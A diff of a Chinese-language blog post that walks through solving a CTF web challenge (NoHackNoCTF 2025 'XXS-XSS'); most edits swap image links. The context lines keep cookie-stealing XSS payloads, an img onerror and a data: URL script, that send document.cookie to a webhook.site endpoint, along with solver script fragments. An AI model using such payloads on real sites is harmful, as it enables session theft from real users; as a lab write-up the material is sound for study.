@@ -4,6 +4,10 @@ description: "NHNC"
 pubDate: "Aug 06 2025"
 categories: ["CTF-WEB"]
 tags: ["CTF-Writeups", "NoHackNoCTF-2025"]
+
+excerpt: |
+  關於 2025 No Hack No CTF 初賽 web 題目 XXS-XSS 的解題思路
+  javascript: 偽協議的特殊效果
 ---
 
 import Color from "@/components/mdx/Color.astro"; // 用 @/ 代表 src/
@@ -13,22 +17,22 @@ import Details from "@/components/mdx/Details.astro";
 
 ## <Color c="red-0">題目</Color>
 
-![image](https://hackmd.io/_uploads/rJAufsIBgx.png)
+![image](@assets/blog-images/no-hack-no-ctf/XXS-XSS-question.png)
 
 ## <Color c="red-0">解題過程(After Event)</Color>
 
 1. 初看感覺又是一題要偷 admin bot 手中的 cookie flag 的 XSS 題。但是仔細 CR(code review) 會發現細節不太一樣，這題需要讓 bot 想辦法造訪 (visit) 到 `/` 根目錄 (`request.remote_addr` 限定要以 `127.0.0.1` 的域名發送的請求)，才能拿到有 flag 的 `index.html`
    - `/visit` 底下：
-     ![image](https://hackmd.io/_uploads/r1G-hEbUge.png)
+     ![image](@assets/blog-images/no-hack-no-ctf/visit-endpoint.png)
 
    - `/` (根目錄)底下：
-     ![image](https://hackmd.io/_uploads/r12Ih4bUgl.png)
+     ![image](@assets/blog-images/no-hack-no-ctf/root-endpoint.png)
 
 &emsp;
 
-2. 接著看 `index.html` 的邏輯為何<Color c="blue-0">(註解是我自己標的)</Color>。看起來相對簡單，重點應該是放在 `window.location.href` 這個 html 屬性上面，如果能夠<Color c="red-0">聯合剛剛拿到的 cookie flag (也就是 flask 的回應物件)</Color> ，並且<Color c="red-0">成功進入 if 判斷式</Color>內，就能夠藉由 `window.location.href` 將 cookie flag 送到 `webhook.site`
+2. 接著看 `index.html` 的內容。重點應該是放在 `window.location.href` 這個 html 屬性上面，如果能夠<Color c="red-0">聯合剛剛拿到的 cookie flag (也就是 flask 的回應物件)</Color> ，並且<Color c="red-0">成功進入 if 判斷式</Color>內，就能夠藉由 `window.location.href` 將 cookie flag 送到 `webhook.site`
 
-![image](https://hackmd.io/_uploads/r1YSREWUxx.png)
+![image](@assets/blog-images/no-hack-no-ctf/index-html-body.png)
 
 &emsp;
 
@@ -38,9 +42,9 @@ import Details from "@/components/mdx/Details.astro";
 
 - 但是在這之前，這題還有兩道關卡，分別是<Color c="red-0">請求 url 限制</Color>和<Color c="red-0">找 nonce 的挑戰</Color>，找 nonce 挑戰的目的應該是為了避免一次送多個請求
   - `/get_challenge` 的實作
-    ![image](https://hackmd.io/_uploads/Hk2iXBZIlx.png)
+    ![image](@assets/blog-images/no-hack-no-ctf/get-challenge-endpoint.png)
   - `/visit` 底下關於 url 和 nonce 的詳細限制
-    ![image](https://hackmd.io/_uploads/HypI4rZIel.png)
+    ![image](@assets/blog-images/no-hack-no-ctf/visit-url-nonce-restrict.png)
 
 &emsp;
 
@@ -75,13 +79,13 @@ payload_response = s.get(url = f'{url}/visit?url={encoded_relay_url}&nonce={nonc
 </Details>
 
 - 題目給的 `solver` ：
-  ![image](https://hackmd.io/_uploads/B1izdHbLge.png)
+  ![image](@assets/blog-images/no-hack-no-ctf/solve-pow.png)
 
 - 針對 step 3 part (1) 的 script ：
-  ![image](https://hackmd.io/_uploads/rJDNvB-8lx.png)
+  ![image](@assets/blog-images/no-hack-no-ctf/solver-into-script.png)
 
 - `app.py` 跑在 port 5000 上：
-  ![image](https://hackmd.io/_uploads/rktMG8bUgl.png)
+  ![image](@assets/blog-images/no-hack-no-ctf/port.png)
 
 &emsp;
 
@@ -106,7 +110,7 @@ payload_response = s.get(url = f'{url}/visit?url={encoded_relay_url}&nonce={nonc
   ```
 
 - 但是很明顯這些 payload 的長度都超過 15 了，直接塞到 url 這個 query string 行不通，但是注入 name 這個 query string 也不行，因為前端對 name 的存取方式用的是 `.textContent` ，所以沒辦法塞入任何 JS code
-  ![image](https://hackmd.io/_uploads/ryNLn4M8lx.png)
+  ![image](@assets/blog-images/no-hack-no-ctf/inject-what.png)
 
 &emsp;
 
@@ -148,10 +152,10 @@ print("payload message :", payload_response.text)
 
 </Details>
 
-![image](https://hackmd.io/_uploads/HJrUq4ZUex.png)
-![image](https://hackmd.io/_uploads/SyrudV-Llx.png)
-![image](https://hackmd.io/_uploads/rk_69NZUlx.png)
-![image](https://hackmd.io/_uploads/rkqF5EW8le.png)
+![image](@assets/blog-images/no-hack-no-ctf/webhook-decode-1.png)
+![image](@assets/blog-images/no-hack-no-ctf/cyberchef-fake-flag.png)
+![image](@assets/blog-images/no-hack-no-ctf/cyberchef-real-flag.png)
+![image](@assets/blog-images/no-hack-no-ctf/solve-cert.png)
 
 - **flag🚩 :`NHNC{javascript:xssed!&xssed!=alert(/whale/)}`**
 
@@ -165,8 +169,8 @@ print("payload message :", payload_response.text)
    payload_response = s.get(url = f'{url}/visit?url=...&name=...&nonce=...')
    ```
 
-![image](https://hackmd.io/_uploads/SyU9EV-8lg.png)
-![image](https://hackmd.io/_uploads/BJdxHSzLxg.png)
+![image](@assets/blog-images/no-hack-no-ctf/docker-terminal-1.png)
+![image](@assets/blog-images/no-hack-no-ctf/docker-terminal-2.png)
 
 &emsp;
 
@@ -188,7 +192,7 @@ payload_response = s.get(url = f'{url}/visit?url={encoded_relay_url}&nonce={nonc
 
 - 結果我在 `webhook.site` 還是沒有發現 cookie ，回去檢查後端回顯(自己額外加的)才發現第二層 url 也要自己做一次 URL Encode
 
-![image](https://hackmd.io/_uploads/ryzDw4-8el.png)
+![image](@assets/blog-images/no-hack-no-ctf/docker-terminal-3.png)
 
     ```python
     payload = f'<img src=x onerror="location=`{webhook}/?c=`+btoa(document.cookie)">'
@@ -207,8 +211,8 @@ payload_response = s.get(url = f'{url}/visit?url={encoded_relay_url}&nonce={nonc
 
    `payload = f'data:text/html,<script>location="{webhook}/?c="+document.cookie</script>'`
    - cookie 沒有做 base64 可能會在 decode 時被 browser 解碼而丟失
-     ![image](https://hackmd.io/_uploads/ByDO_rGUxl.png)
+     ![image](@assets/blog-images/no-hack-no-ctf/cyberchef-encode-once.png)
 
    ``payload = f'<img src=x onerror="location=`{webhook}/?c=`+btoa(document.cookie)">'``
-   ![image](https://hackmd.io/_uploads/S1P4trfLge.png)
-   ![image](https://hackmd.io/_uploads/HJxUYHGLxx.png)
+   ![image](@assets/blog-images/no-hack-no-ctf/cyberchef-encode-twice.png)
+   ![image](@assets/blog-images/no-hack-no-ctf/webhook-decode-2.png)
